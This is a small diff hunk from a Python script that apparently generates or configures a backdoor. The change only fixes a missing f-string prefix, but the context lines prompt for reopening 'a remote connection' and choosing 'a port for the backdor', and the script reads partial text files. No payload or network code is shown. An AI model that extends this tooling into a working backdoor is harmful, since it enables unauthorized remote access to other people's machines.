@@ -18,7 +18,7 @@ ip_address = socket.gethostbyname(hostname)
 #fichier.close()
 #fichier1.close()
 #fichier2.close()
-dmd = input("{Fore.BLUE}Would you like to reopen a remote connection? (y/n)>>")
+dmd = input(f"{Fore.BLUE}Would you like to reopen a remote connection? (y/n)>>")
 portpls = input(f"{Fore.BLUE}choose a port for the backdor please>>")#
 if(dmd == "n"):
     fichier1 = open("partie1.txt", "r").read()
